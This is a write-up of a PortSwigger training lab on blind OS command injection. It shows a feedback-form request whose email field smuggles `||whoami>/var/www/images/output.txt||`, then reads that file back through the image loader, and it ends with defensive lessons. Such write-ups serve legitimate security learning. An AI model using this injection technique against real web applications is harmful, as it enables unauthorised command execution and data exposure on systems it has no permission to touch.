# OS Command Injection Lab 3 — Blind OS command injection with output redirection — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** OS Command Injection (blind)
**Lab:** Blind OS command injection with output redirection
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~03:44 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Blind OS Command Injection with output redirection — the shop's feedback form passes the `email` field into a server-side shell command whose output is never returned. The output is recovered by redirecting it into a file inside the web root, then reading that file back through the image-loading URL.

## Solution

1. Fetched the feedback form (`GET /feedback`) and took its CSRF token.
2. Submitted feedback with the injection in the `email` field, redirecting `whoami` output to a file:
   ```
   POST /feedback/submit
   Content-Type: application/x-www-form-urlencoded

   csrf=<token>&name=Test&email=||whoami>/var/www/images/output.txt||&subject=Test&message=Test
   ```
3. Retrieved the file through the image loader:
   ```
   GET /image?filename=output.txt
   ```
   Response: `peter-La9Lbc` — the `whoami` output.
4. Home page then showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why redirect to `/var/www/images/`:** that folder is web-accessible through the `/image?filename=` loader, so any file written there can be read back over HTTP. The redirect turns a blind injection into a visible one.
- **Why `||` on both sides:** same as Lab 2 — the leading `||` runs our command when the application's own command fails, the trailing `||` keeps the rest of the line harmless.
- **The key detail:** the lab user is again a random `peter-XXXXXX` name (here `peter-La9Lbc`) — retrievable only by running the command, never by guessing.

## Lessons Learned

- Output redirection is the classic blind-injection upgrade: if the app lets you write a file into a web-served folder, blindness disappears.
- The same technique failed on the Lab 4/5 instances (their feedback commands run asynchronously and the file never appears) — blind techniques are instance-specific, and when redirection doesn't work the next step is an out-of-band channel (Burp Collaborator).
- Defense in depth: validate the email, never shell out with user input, and never let the web server write into folders it also serves.
